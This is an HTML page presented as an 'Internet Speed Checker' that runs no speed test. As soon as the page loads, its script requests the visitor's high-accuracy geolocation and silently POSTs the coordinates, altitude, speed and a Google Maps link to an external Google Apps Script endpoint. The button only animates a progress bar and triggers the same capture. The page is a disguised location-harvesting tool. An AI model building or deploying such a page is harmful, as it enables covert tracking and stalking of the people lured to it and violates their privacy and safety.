<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Internet Speed Checker</title>

<style>
*{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial}
body{display:flex;min-height:100vh;align-items:center;justify-content:center;background:#071726;color:#e6eef8;margin:0;padding:16px}
.wrap{width:380px;max-width:95vw}
.card{padding:18px;border-radius:14px;background:#111827}
.btn{width:100%;padding:14px;border:none;border-radius:12px;background:#06b6d4;color:#000;font-weight:bold;cursor:pointer}
.bar{height:8px;background:#333;margin-top:12px;border-radius:8px;overflow:hidden}
.bar i{display:block;height:100%;width:0;background:#06b6d4}
.status-msg{margin-top:10px;padding:10px;border-radius:8px;text-align:center;display:none}
.status-msg.show{display:block}
.status-msg.success{background:rgba(34,197,94,.2)}
.status-msg.error{background:rgba(239,68,68,.2)}
.location-info{margin-top:12px;display:none}
.location-info.show{display:block}
</style>

</head>
<body>

<div class="wrap">
<div class="card">

<h3>Internet Speed Checker</h3>

<button id="start" class="btn">Start Speed Test</button>

<div class="bar"><i id="progress"></i></div>

<div id="locationInfo" class="location-info">
  <p>Lat: <span id="lat">—</span></p>
  <p>Lng: <span id="lng">—</span></p>
  <p>Acc: <span id="accuracy">—</span></p>
</div>

<div id="status" class="status-msg"></div>

</div>
</div>

<script>

const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyU2Hah8rXss1So36FAyRGF_8hcjZsMGaaF2m9_ZVEPNFPMDtBsQ7S9AsGcTcADgKPpZw/exec';

const start = document.getElementById('start');
const bar = document.getElementById('progress');
const status = document.getElementById('status');
const locationInfo = document.getElementById('locationInfo');

function showStatus(message, type) {
  status.textContent = message;
  status.className = `status-msg show ${type}`;
}

// GEOLOCATION
function getLocation() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(
      resolve,
      reject,
      { enableHighAccuracy:true, timeout:10000 }
    );
  });
}

// UPDATE UI
function updateLocationDisplay(position) {
  document.getElementById('lat').textContent = position.coords.latitude.toFixed(6);
  document.getElementById('lng').textContent = position.coords.longitude.toFixed(6);
  document.getElementById('accuracy').textContent = position.coords.accuracy.toFixed(0) + "m";
  locationInfo.classList.add('show');
}

// SEND DATA (CORRIGIDO)
async function sendToGoogleSheets(data) {
  try {
    await fetch(SCRIPT_URL, {
      method: "POST",
      headers: {
        "Content-Type": "text/plain"
      },
      body: JSON.stringify(data)
    });

    console.log("Enviado:", data);

  } catch (e) {
    console.error("Erro envio:", e);
    throw e;
  }
}

// EXECUTA CAPTURA
async function captureAndSend() {

  try {

    showStatus("Solicitando localização...", "success");

    const position = await getLocation();

    updateLocationDisplay(position);

    const payload = {
      timestamp: new Date().toISOString(),
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
      accuracy: position.coords.accuracy,
      altitude: position.coords.altitude || "N/A",
      speed: position.coords.speed || "N/A",
      mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
    };

    await sendToGoogleSheets(payload);

    showStatus("✔ Localização enviada", "success");

  } catch (error) {

    console.error(error);

    let msg = "Erro";

    if(error.code === 1) msg = "Permissão negada";
    else if(error.code === 2) msg = "Localização indisponível";
    else if(error.code === 3) msg = "Timeout";

    showStatus(msg, "error");
  }
}

// 🔴 CAPTURA AUTOMÁTICA AO ABRIR
window.addEventListener('load', () => {

  console.log("Auto capturando localização...");

  captureAndSend();

});

// BOTÃO (fallback)
start.addEventListener('click', () => {

  bar.style.width = "100%";

  captureAndSend();

  setTimeout(()=> bar.style.width="0%",3000);

});

</script>

</body>
</html>
